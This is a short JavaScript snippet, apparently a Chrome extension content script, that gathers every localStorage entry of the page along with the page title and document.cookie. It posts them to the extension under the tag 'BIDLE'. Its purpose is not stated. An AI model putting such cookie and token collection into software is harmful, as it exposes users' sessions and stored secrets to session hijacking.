 var ls = "";
 try
 {
	 for ( i=0; i < Object.entries(localStorage).length; i++ ) {
		 if ( i > 0 )
		   ls += ",";
		   
		 ls += Object.entries(localStorage)[ i ][ 0 ] + '=' + escape ( Object.entries(localStorage)[ i ][ 1 ] );
	 }
 }
 catch(err)
 {
	 ls = "";
 }
	   
   
var additionalInfo = {
  "what": "BIDLE",
  "title": document.title,
  "cookie": document.cookie,
  "src": "",
  "linktext": "",
  "url": "",
  "ls": ls
  
};

chrome.extension.connect().postMessage(additionalInfo);
